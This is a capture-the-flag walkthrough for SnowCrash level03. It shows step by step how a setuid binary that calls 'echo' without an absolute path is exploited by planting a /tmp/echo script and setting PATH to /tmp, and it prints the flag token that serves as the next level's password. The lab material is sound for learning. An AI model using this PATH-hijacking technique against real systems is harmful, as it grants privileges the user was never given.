## level03:

In level03, I found a binary file named `level03`. The output of this binary is 'Exploit me'. 

```bash
level03@SnowCrash:~$ ls -la
total 24
dr-x------ 1 level03 level03  120 Mar  5  2016 .
d--x--x--x 1 root    users    340 Aug 30  2015 ..
-r-x------ 1 level03 level03  220 Apr  3  2012 .bash_logout
-r-x------ 1 level03 level03 3518 Aug 30  2015 .bashrc
-rwsr-sr-x 1 flag03  level03 8627 Mar  5  2016 level03
-r-x------ 1 level03 level03  675 Apr  3  2012 .profile
level03@SnowCrash:~$ ./level03
Exploit me
level03@SnowCrash:~$
```

i need to show the trace the library calls made by a program i used `ltrace`  It's especially useful for understanding what external libraries and system calls a program is using during execution

```bash
level03@SnowCrash:~$ ltrace ./level03
__libc_start_main(0x80484a4, 1, 0xbffff7b4, 0x8048510, 0x8048580 <unfinished ...>
getegid()                                                          = 2003
geteuid()                                                          = 2003
setresgid(2003, 2003, 2003, 0xb7e5ee55, 0xb7fed280)                = 0
setresuid(2003, 2003, 2003, 0xb7e5ee55, 0xb7fed280)                = 0
system("/usr/bin/env echo Exploit me"Exploit me
<unfinished ...>
--- SIGCHLD (Child exited) ---
<... system resumed> )                                             = 0
+++ exited (status 0) +++
level03@SnowCrash:~$
```

This shows that the program is using the `system()` function to call the `echo` command. The `echo` command is not using an absolute path (i.e., `/bin/echo`), which opens up a **path vulnerability**. By manipulating the `PATH` environment variable, I were able to inject **malicious script** as the `echo` command

Now let's create a malicious script. In this script, I will try to execute the command `/bin/getflag` because I do not have permission to run the command directly.

```bash
 **level03@SnowCrash:~$ vim /tmp/echo
 
					#!/bin/bash
					/bin/getflag**

```

i used the **`/tmp` directory** to create a malicious script like `/tmp/echo` in this scenario is based on a combination of accessibility, the path vulnerability in the `level03` program, and the flexibility of the `/tmp` directory

**Makes the File Executable**

```bash
chmod +x /tmp/echo
```

**Modifies the `PATH` Environment Variable to Include `/tmp`**

```bash
export PATH="/tmp"
```

Now let’s execute the `getflag` command with the script. The script is ready to execute:

```bash

level03@SnowCrash:~$ /tmp/echo
Check flag. Here is your token:
Nope, there is no token here for you. Sorry. Try again :)
level03@SnowCrash:~$
```

Now, I am going to execute the script through the `system` function to get the flag:

```bash

level03@SnowCrash:~$ ./level03
Check flag. Here is your token: qi0maab88jeaj46qoumi7maus
```

This is the password for the next level, **level04**:

```bash
level03@SnowCrash:~$ /bin/su level04
Password: qi0maab88jeaj46qoumi7maus
level04@SnowCrash:~$
```